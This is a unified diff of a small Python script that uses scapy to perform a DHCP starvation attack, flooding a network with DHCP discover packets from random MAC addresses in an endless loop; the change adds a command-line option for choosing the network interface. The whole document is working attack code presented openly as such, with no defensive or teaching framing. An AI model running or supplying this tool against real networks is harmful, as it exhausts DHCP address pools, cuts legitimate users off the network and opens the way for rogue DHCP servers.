@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
+
 from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, conf
+import argparse
 
 # Disable IP address checking to allow arbitrary source IPs
 conf.checkIPaddr = False
 
-
 # Function to create and send DHCP discovery packets
-def dhcp_starvation():
+def dhcp_starvation(interface):
     # Create a random MAC address
     random_mac = RandMAC()
 
@@ -20,9 +21,14 @@ def dhcp_starvation():
     )
 
     # Send packets continuously on the specified interface
-    print("[*] Starting DHCP Starvation Attack...")
-    sendp(dhcp_discover, iface='wlan0', loop=1, verbose=1)
-# Enter the correct interface depending on your machine.
+    print(f"[*] Starting DHCP Starvation Attack on interface {interface}...")
+    sendp(dhcp_discover, iface=interface, loop=1, verbose=1)
 
 if __name__ == "__main__":
-    dhcp_starvation()
+    # Set up argument parsing
+    parser = argparse.ArgumentParser(description="Perform a DHCP starvation attack.")
+    parser.add_argument('-i', '--interface', default='wlan0', help='Network interface to use (default: wlan0)')
+    args = parser.parse_args()
+
+    # Call the function with the specified interface
+    dhcp_starvation(args.interface)
